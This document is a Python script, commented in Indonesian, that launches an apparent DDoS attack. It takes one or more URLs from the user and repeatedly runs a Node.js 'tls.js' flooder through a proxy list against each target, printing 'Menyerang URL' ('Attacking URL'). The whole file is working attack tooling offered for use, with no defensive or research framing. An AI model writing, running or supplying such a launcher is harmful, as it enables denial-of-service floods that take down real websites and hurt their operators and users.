import os
import time
import subprocess
import validators  # Library untuk memvalidasi URL, instal dengan `pip install validators`

# Path to the Node.js script dan proxy file
tls_script = "tls.js"  # Pastikan file `tls.js` ada di direktori yang sama
proxy_file = "proxy.txt"  # Pastikan file `proxy.txt` ada dan valid

# Validasi keberadaan file TLS script dan proxy
if not os.path.isfile(tls_script):
    print(f"Error: File {tls_script} tidak ditemukan.")
    exit()

if not os.path.isfile(proxy_file):
    print(f"Error: File {proxy_file} tidak ditemukan.")
    exit()

# Meminta input URL dari pengguna
url_input = input("Masukkan URL atau beberapa URL (pisahkan dengan koma): ")
urls = [url.strip() for url in url_input.split(",")]  # Memisahkan URL berdasarkan koma dan menghapus spasi ekstra

# Validasi setiap URL yang dimasukkan
valid_urls = []
for url in urls:
    if validators.url(url):
        valid_urls.append(url)
    else:
        print(f"[SKIP] URL tidak valid: {url}")

if not valid_urls:
    print("Tidak ada URL yang valid. Program dihentikan.")
    exit()

# Mulai menyerang URL
try:
    for url in valid_urls:
        print(f"[INFO] Menyerang URL: {url}")
        while True:
            try:
                # Eksekusi Node.js script
                result = subprocess.run(
                    ["node", tls_script, url, "6000", "64", "10", proxy_file],
                    capture_output=True,
                    text=True
                )
                # Logging output dari script
                if result.returncode == 0:
                    print(f"[SUCCESS] {result.stdout.strip()}")
                else:
                    print(f"[ERROR] {result.stderr.strip()}")
                
                # Tunggu sebelum menjalankan permintaan berikutnya
                time.sleep(10)
            except KeyboardInterrupt:
                print("[INFO] Dihentikan oleh pengguna.")
                break
            except Exception as e:
                print(f"[ERROR] Kesalahan saat eksekusi: {e}")
                break
except Exception as e:
    print(f"[FATAL] Kesalahan sistem: {e}")

